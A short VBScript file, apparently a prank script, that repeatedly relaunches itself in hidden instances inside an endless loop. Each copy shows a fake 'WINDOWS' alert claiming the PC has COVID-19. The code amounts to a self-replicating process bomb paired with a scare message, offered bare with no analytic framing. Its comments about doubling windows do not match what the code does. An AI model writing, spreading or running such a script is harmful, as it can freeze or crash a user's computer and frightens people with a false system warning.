Dim i
i = 1 ' Start with 1 message box

Do
    For j = 1 To i
        ' Run the same script in a new instance to create multiple windows
        CreateObject("WScript.Shell").Run "wscript " & WScript.ScriptFullName, 0, False
    Next
	i = i - 2 ' Double the number of windows in the next iteration

    ' Show the current message box in the current instance
    MsgBox "Your PC now has COVID-19. Do you want to put This PC in quarantine?", 0+48, "WINDOWS"
    
    i = i + 2 ' Double the number of windows in the next iteration
Loop
